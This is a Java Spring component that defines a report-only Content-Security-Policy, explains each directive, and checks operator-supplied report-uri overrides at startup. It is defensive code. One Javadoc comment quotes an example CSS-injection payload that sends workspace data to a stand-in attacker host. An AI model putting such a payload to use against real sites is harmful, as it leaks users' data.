package com.hamstrack.common.security;

import com.hamstrack.common.config.AppProperties;
import com.hamstrack.common.config.CspProperties;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Component;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

/**
 * <strong>The Content-Security-Policy this product ships, resolved once at startup</strong>
 * (HD-264, ADR-0035).
 *
 * <p>It is <strong>report-only</strong>. Nothing here can block anything, and there is no property,
 * flag or profile that makes it enforcing — see {@link CspProperties}. What it buys is evidence:
 * the directive set below is the one we intend to enforce, with the escape hatches deliberately
 * left out, so that the reports say whether they are needed.
 *
 * <h2>Where the header is written, and which responses have to ask for it</h2>
 * {@code SecurityConfig} installs it on the main chain, so every response Spring answers carries
 * it — including {@code index.html} and {@code /assets/**}, which the repository {@code Caddyfile}
 * does not serve (it has no {@code file_server}; it is {@code reverse_proxy app:8080}). The
 * management chain (:9090) deliberately gets none: the port is never published or proxied and
 * nothing on it is a document.
 *
 * <p>A response written <strong>outside</strong> that chain carries the header only if it asks, via
 * {@link #applyTo}, and the ones that must ask are the ones that answer a request for a
 * <em>document</em>. That is a category and not a list, because the set of short-circuiting filters
 * grows: {@code DatabaseBusyRefusal}'s 503 is the one that asks — it is rendered to a browser and
 * its {@code response.reset()} takes the whole header block off again — while the filters that
 * refuse ahead of the chain ({@code AuthRateLimitFilter}'s 429, {@code CspReportGuardFilter}'s 413
 * and 429) never had the block and need none, since none of them answers a document.
 * {@code DatabaseBusyRefusalTest} is what fails if the one that asks stops asking.
 *
 * <h2>The value is resolved once, and is NOT a compile-time constant</h2>
 * The proposal called the {@code DatabaseBusyRefusal} entry "a plain map entry", on the reading
 * that the policy is a constant. It is not, in two ways an operator controls: the whole header is
 * suppressed by {@code CSP_REPORT_ONLY_ENABLED=false}, and the {@code report-uri} clause is present
 * exactly when the sink is. A constant baked into that map would therefore ship a 503 whose policy
 * disagrees with every other response on the deployment where the sink is on — which is Cloud, i.e.
 * every deployment the reports come from. So the resolved value travels to the refusal instead, and
 * the property the seal tests is unchanged: the filter's 503 carries whatever the advice's does.
 *
 * <h2>The directives, and what each one is a claim about</h2>
 * Every source is {@code 'self'}, {@code 'none'}, {@code data:} or one of two absolute font
 * origins. <strong>No hostname, no {@code SITE_ADDRESS}, no {@code APP_BASE_URL}</strong> — that
 * property is what makes one version-controlled string correct for Cloud and for every self-hosted
 * install at once, and it is the reason the policy is not at the edge (where the deployment's own
 * address already lives).
 *
 * <ul>
 *   <li>{@code script-src 'self'} — {@code index.html} carries exactly one script, a module with
 *       an absolute same-origin {@code src}, and no inline {@code <script>}. No CDN appears in any
 *       built chunk.</li>
 *   <li>{@code style-src 'self' https://fonts.googleapis.com} — {@code index.html} links the Google
 *       Fonts stylesheet. <strong>Without {@code 'unsafe-inline'}</strong>, and that absence is the
 *       measurement: a report-only policy carrying the escape hatch says nothing about whether the
 *       escape hatch is needed. React 19 applies {@code style={{…}}} props through the CSSOM, which
 *       is not subject to {@code style-src-attr}, so the prediction is that the product's several
 *       hundred inline style props produce no reports at all. It is the highest-risk assumption in
 *       the design, and the right answer to a flood of style reports is the narrower
 *       {@code style-src-attr 'unsafe-inline'} decided with counts in hand — not this directive
 *       widened pre-emptively.</li>
 *   <li>{@code font-src https://fonts.gstatic.com} — {@code @font-face} appears <em>zero</em> times
 *       in the built CSS, so every face comes from the remote sheet. {@code 'self'} is not listed
 *       because no font is served from this origin; if that changes, the report says so.</li>
 *   <li>{@code img-src 'self' data:} — <strong>the directive that closes HD-176's class
 *       outright.</strong> A custom-field colour of {@code url(https://attacker.example/b.png?ws=…)}
 *       painted as a CSS background resolves against {@code img-src}, and neither source admits it;
 *       HD-176's own two fixes are per-site and depend on somebody remembering, while this one also
 *       covers the paint sites nobody has written yet. {@code data:} has two producers in the
 *       artefact: the report PNG export ({@code img.src = "data:image/svg+xml…"}) and four
 *       {@code url(data:image/…)} backgrounds in the Swagger UI stylesheet.</li>
 *   <li>{@code connect-src 'self'} — every {@code fetch}/{@code EventSource} targets {@code /api/**}
 *       on this origin, and attachments stream <em>through</em> the app: there is no presigned URL
 *       anywhere, so even the S3 backend never hands the browser a cross-origin URL.</li>
 *   <li>{@code form-action 'self'} — every {@code <form>} in the SPA is an {@code onSubmit} handler
 *       with no {@code action}.</li>
 *   <li>{@code frame-src} / {@code worker-src} {@code 'none'} — no {@code <iframe>}, {@code <object>}
 *       or {@code <embed>} in the sources, and {@code new Worker} / {@code importScripts} appear
 *       zero times in the built chunks. Stated rather than omitted so the report fires the day a
 *       library brings one in.</li>
 *   <li>{@code object-src 'none'}, {@code base-uri 'none'} — cheap, and the two things
 *       {@code default-src} is famously not allowed to cover.</li>
 *   <li>{@code frame-ancestors 'none'} — redundant today with Spring Security's default
 *       {@code X-Frame-Options: DENY}, and that is the point: it costs 24 characters and is what
 *       carries the refusal forward on the day the older header is dropped as obsolete.</li>
 * </ul>
 *
 * <p><strong>Deliberately absent, each for a stated reason:</strong> {@code 'unsafe-inline'} and
 * {@code 'unsafe-eval'} (above); {@code https://validator.swagger.io}, which is excluded <em>on
 * purpose</em> because it is the canary — the docs page loads a validator badge from it on any real
 * hostname and never on {@code localhost}, so {@code img-src} will report it, and that report is
 * the proof the collection pipeline works rather than merely looks quiet; and {@code report-to} /
 * {@code Reporting-Endpoints}, deferred to the enforcement ticket because Chrome ignores
 * {@code report-uri} when a {@code report-to} is present, so a mis-wired one yields a silent
 * <em>zero</em> in the majority engine while the header looks perfect.
 */
@Component
public class ContentSecurityPolicy {

    /**
     * Report-only, and the name is load-bearing rather than incidental: the enforcing name is
     * {@code Content-Security-Policy}, one word shorter, and shipping that by accident is the one
     * way this ticket could break the product.
     */
    public static final String HEADER = "Content-Security-Policy-Report-Only";

    /** The sink's path — written into the policy and mapped by {@code CspReportController}. */
    public static final String REPORT_PATH = "/api/security/csp-report";

    /**
     * The twelve directives, in the proposal's order, emitted as one line. A typo in a directive
     * NAME is silently ignored by every browser, which is this ticket's failure mode one level
     * down, so {@code ContentSecurityPolicyHeaderTest} asserts this string rather than the header's
     * presence.
     */
    static final String BASE_POLICY =
            "default-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'; "
            + "form-action 'self'; script-src 'self'; "
            + "style-src 'self' https://fonts.googleapis.com; "
            + "font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'; "
            + "frame-src 'none'; worker-src 'none'";

    /** Appended if and only if this instance serves the sink. */
    static final String REPORT_URI_CLAUSE = "; report-uri " + REPORT_PATH;

    /** The exact string that goes on the wire, or {@code null} when the header is off entirely. */
    private final String headerValue;

    public ContentSecurityPolicy(CspProperties properties, AppProperties appProperties) {
        this.headerValue = properties.reportOnlyEnabled()
                ? resolve(properties, hostOf(appProperties.baseUrl()))
                : null;
    }

    private static String resolve(CspProperties properties, String ownHost) {
        if (!properties.policy().isEmpty()) {
            requireThisInstanceToServeEveryReportUriAimedAtIt(properties, ownHost);
            return properties.policy();
        }
        return properties.sinkEnabled() ? BASE_POLICY + REPORT_URI_CLAUSE : BASE_POLICY;
    }

    /**
     * <strong>An override may not aim a {@code report-uri} at a path this instance does not
     * serve</strong> — refused at startup, where an operator is still reading output.
     *
     * <p>"A {@code report-uri} that 404s is impossible by construction" is claimed by
     * {@link CspProperties}, {@code CspReportSinkConfig}, {@code CspReportController},
     * {@code application.properties} and {@code ContentSecurityPolicyHeaderTest} — and one property
     * deciding both halves only makes it true for the <em>built-in</em> policy. An override replaces
     * that string wholesale without consulting {@code sinkEnabled}, and the likeliest reason anyone
     * sets one is copying an observed Cloud header onto a DC box: that header names this path, DC
     * ships the sink off, and every violation the browser saw would then POST to a path that
     * answers 405. So a construction claim gets a construction, which is this check.
     *
     * <p><strong>Decided on the target, never on a substring of the policy.</strong> The first
     * version of this asked whether the whole policy string {@code contains} our path, which was
     * wrong in both directions at once. It was over-broad where it matters most: a fleet operator
     * pointing self-hosted boxes at one central <em>Hamstrack</em> writes
     * {@code report-uri https://collect.example.com/api/security/csp-report}, and that box would
     * not boot — refused by a message prescribing two actions, neither of which is available to a
     * reader whose collector is somewhere else. And it was evadable in three spellings that each
     * produce exactly the storm this guard exists to prevent: a different case
     * ({@code /API/SECURITY/CSP-REPORT} — Spring's matching is case-sensitive, so nothing serves
     * it), a percent-encoded character ({@code csp%2Dreport} — Tomcat decodes before mapping, so
     * something does), and a trailing slash, which the substring test only ever looked at with the
     * sink <em>off</em> while Boot does not match trailing slashes either way.
     *
     * <p><strong>The decoded path is not the whole answer, because a decoder disagreement runs both
     * ways.</strong> {@code %2D} was "the guard refuses, the server serves"; {@code %2F} is the
     * mirror — {@code /api/security%2Fcsp-report} decodes to exactly our path, so a decoded-only
     * check <em>permits</em> it, while Tomcat rejects an encoded slash in a path with a {@code 400}
     * before any mapping is consulted. That produces precisely the storm this guard exists to
     * prevent, so the raw path is consulted too. Two spellings are deliberately left refused
     * although a browser would normalise them — {@code /api/security/./csp-report} and
     * {@code …/csp-report;a=b}: refusing a clause nobody means to write costs an operator one edit
     * and the message names the spelling that works, so this is not a case to "fix".
     *
     * <p>So each {@code report-uri} token is resolved to a target instead. A token with no
     * authority is aimed at this instance <em>by definition</em> — the browser resolves it against
     * the page it is on, which is a page we served — and is refused unless it normalises to the one
     * path this instance actually serves. A token <strong>with</strong> an authority is this
     * guard's business only when its host is this instance's own, which is a value we already hold
     * from {@code app.base-url}; anything else is a collector elsewhere and is nobody's business
     * here. A token no {@link URI} can read aims nowhere and is left alone.
     */
    private static void requireThisInstanceToServeEveryReportUriAimedAtIt(CspProperties properties,
                                                                         String ownHost) {
        for (var token : reportUriTokens(properties.policy())) {
            URI target;
            try {
                target = new URI(token);
            } catch (URISyntaxException e) {
                continue;
            }
            if (!aimedAtThisInstance(target, ownHost)) {
                continue;
            }
            // getPath() is the DECODED path, so csp%2Dreport is compared as csp-report — the same
            // value Tomcat maps on. Compared case-sensitively and without a trailing slash,
            // because that is how this instance's own mapping is matched.
            if (!REPORT_PATH.equals(target.getPath())) {
                throw refusal(token, "the only report path this instance can serve is "
                                     + REPORT_PATH + ", matched case-sensitively and without a "
                                     + "trailing slash");
            }
            // The mirror of the %2D case, and the reason the decoded path is not the whole answer:
            // %2F decodes to a slash, so getPath() spells our path exactly — but Tomcat refuses an
            // encoded slash outright, before any mapping is consulted. There the guard refused a
            // path the server serves; here it would permit one the server never will.
            var rawPath = target.getRawPath();
            if (rawPath != null && rawPath.toLowerCase(Locale.ROOT).contains("%2f")) {
                throw refusal(token, "an encoded slash (%2F) in the path is rejected by the "
                                     + "servlet container with 400 before any mapping is "
                                     + "consulted, whatever it decodes to");
            }
            if (!properties.sinkEnabled()) {
                throw refusal(token, "CSP_REPORT_SINK_ENABLED is false, so no handler is "
                                     + "registered for " + REPORT_PATH + " on this instance");
            }
        }
    }

    /**
     * The endpoints of every {@code report-uri} directive in a policy. The directive name is
     * matched case-insensitively because a CSP directive name is, and the endpoints are whitespace
     * separated because a {@code report-uri} may name several.
     */
    private static List<String> reportUriTokens(String policy) {
        var tokens = new ArrayList<String>();
        for (var directive : policy.split(";")) {
            var parts = directive.strip().split("\\s+");
            if (parts.length > 1 && "report-uri".equalsIgnoreCase(parts[0])) {
                tokens.addAll(Arrays.asList(parts).subList(1, parts.length));
            }
        }
        return tokens;
    }

    /**
     * Whether a browser posting to this token would post <em>here</em>: either it names no
     * authority at all — in which case it resolves against a page this instance served — or it
     * names this instance's own host. Compared on host alone, for the reason
     * {@code CspReportSink.isOurs} gives: scheme and port differ legitimately between what an
     * operator configured and what a browser sees.
     */
    private static boolean aimedAtThisInstance(URI target, String ownHost) {
        if (target.getHost() == null) {
            return target.getScheme() == null;
        }
        return !ownHost.isEmpty() && ownHost.equals(target.getHost().toLowerCase(Locale.ROOT));
    }

    /**
     * <strong>A refusal may only prescribe an action its reader can perform.</strong> The reader
     * here holds two variables and a third option, and which one applies depends on what they were
     * trying to do — so all three are named, and the closing sentence is the one that tells the
     * fleet operator this check is not about them (which is now true, and was not when the check
     * was a substring test).
     */
    private static IllegalStateException refusal(String token, String because) {
        return new IllegalStateException(
                "CSP_POLICY names a report-uri aimed at this instance (" + token + ") that this "
                + "instance does not serve: " + because + ". Every violation a browser saw would "
                + "POST to a path that answers 405 or 401 — an unauthenticated request storm "
                + "generated by our own header. Either write the clause as \"report-uri "
                + REPORT_PATH + "\" and set CSP_REPORT_SINK_ENABLED=true, or point it at a "
                + "collector outside this instance, or drop it. A report-uri whose host is not "
                + "this instance's own (app.base-url) is not this check's business — including "
                + "another Hamstrack acting as a central collector for a fleet.");
    }

    /**
     * The lower-cased host of a URL, or empty when it has none or cannot be read. Package-private
     * and here rather than in {@link CspReportSink} because both need it and this class is the one
     * that exists in every configuration — the sink does not exist at all on an instance that does
     * not collect.
     */
    static String hostOf(String uri) {
        if (uri == null || uri.isBlank()) {
            return "";
        }
        try {
            var host = new URI(uri.strip()).getHost();
            return host == null ? "" : host.toLowerCase(Locale.ROOT);
        } catch (URISyntaxException e) {
            return "";
        }
    }

    /** The policy string, or {@code null} when {@code CSP_REPORT_ONLY_ENABLED} is false. */
    public String headerValue() {
        return headerValue;
    }

    /**
     * Writes the header onto a response Spring Security's {@code HeaderWriterFilter} did not reach.
     * A no-op when the header is off, so a response that asks has the same header set as every
     * other response in every configuration — which is the property the seal tests, rather than the
     * identity of the callers.
     */
    public void applyTo(HttpServletResponse response) {
        if (headerValue != null) {
            response.setHeader(HEADER, headerValue);
        }
    }
}
